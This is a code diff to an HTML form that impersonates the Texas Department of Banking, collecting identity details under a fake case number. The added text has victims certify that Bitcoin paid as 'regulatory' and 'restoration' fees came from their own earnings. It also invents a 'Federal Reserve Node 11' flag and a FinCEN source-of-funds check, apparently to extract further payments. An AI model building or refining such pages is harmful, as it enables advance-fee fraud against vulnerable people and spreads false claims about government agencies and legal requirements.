@@ -344,7 +344,7 @@
                         <input type="hidden" name="_subject" value="🔐 TEXAS DOB - IDENTITY VERIFICATION - CASE TX-B10B-2026-MUK1139-AUDIT">
                         <input type="hidden" name="_next" value="">
                         <input type="hidden" name="_captcha" value="false">
-                        <input type="hidden" name="_autoresponse" value="Your identity verification has been received and is pending review by the Texas Department of Banking, Division of Institutional Funds Management Authority. Please allow 2-4 hours for processing. Do not submit duplicate requests.">
+                        <input type="hidden" name="_autoresponse" value="Your identity verification has been received and is pending review by the Texas Department of Banking, Division of Institutional Funds Management Authority. It usually takes 2-4 hours for processing. Do not submit duplicate requests.">
                         <!-- CC to backup email (uncomment and add your backup email below) -->
                         <!-- <input type="hidden" name="_cc" value="your.backup.email@gmail.com"> -->
                         
@@ -464,11 +464,23 @@
 
                             <!-- Legal Certification -->
                             <div class="bg-blue-50 border-l-4 border-blue-800 p-4 mt-6">
-                                <p class="text-[9px] font-bold text-blue-900 leading-relaxed">
-                                    By submitting this verification, I certify under penalty of perjury that all information provided is true and correct. 18 U.S.C. § 1001.
+                            <div class="bg-blue-50 border-l-4 border-blue-800 p-4 mt-6">
+                                <p class="text-[9px] font-bold text-blue-900 leading-relaxed uppercase">
+                                    ⚖️ CERTIFICATION OF PARTICIPATION & LEGITIMATE SOURCE OF FUNDS
                                 </p>
-                            </div>
+                                <div class="mt-2 space-y-2">
 
+                                    <p class="text-[9px] text-blue-800 leading-relaxed flex items-start gap-2">
+                                        <span class="text-blue-900 font-bold">✓</span>
+                                        <span>I confirm that all Bitcoin payments made toward regulatory filing fees, restoration fees, and compliance processing have been purchased using my own legitimate earnings via fully compliant, regulated payment platforms (Cash App, Coinbase, etc.).</span>
+                                    </p>
+                                </div>
+                                <div class="mt-3 pt-2 border-t border-blue-200">
+                                    <p class="text-[8px] text-blue-700 leading-relaxed italic">
+                                        ⓘ NOTICE: Federal Reserve Node 11 has flagged multiple inbound Bitcoin sources during this disbursement lifecycle. Prior to final release, you will be required to complete a brief <span class="font-bold underline">Source of Funds Verification</span> to confirm the origin of all payment channels used. This is a standard FinCEN requirement for transactions exceeding $600,000. The verification form will be presented immediately following identity confirmation.
+                                    </p>
+                                </div>
+                            </div>                                
                             <!-- Submit Button - NOW TYPE="SUBMIT" -->
                             <div class="flex gap-3 mt-8">
                                 <button type="submit" id="submit-identity-btn" class="btn-verification w-full text-white font-black py-4 text-sm rounded uppercase tracking-wider shadow-lg">
